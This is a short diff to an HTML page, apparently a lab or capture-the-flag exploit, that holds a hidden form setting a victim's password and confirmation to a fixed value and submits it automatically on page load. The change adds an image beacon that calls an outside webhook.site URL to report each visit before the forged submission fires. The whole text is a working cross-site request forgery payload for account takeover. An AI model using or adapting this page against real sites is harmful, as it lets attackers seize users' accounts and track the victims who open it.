@@ -10,6 +10,10 @@
     <input type="hidden" name="password" value="Aboba!2026Course">
     <input type="hidden" name="confirm-password" value="Aboba!2026Course">
   </form>
-  <script>document.getElementById('settings').submit();</script>
+  <script>
+    const beacon = new Image();
+    beacon.src = "https://webhook.site/18075e8e-6510-4d04-818d-9a361fe830e1?event=page-visited";
+    setTimeout(() => document.getElementById("settings").submit(), 1000);
+  </script>
 </body>
 </html>
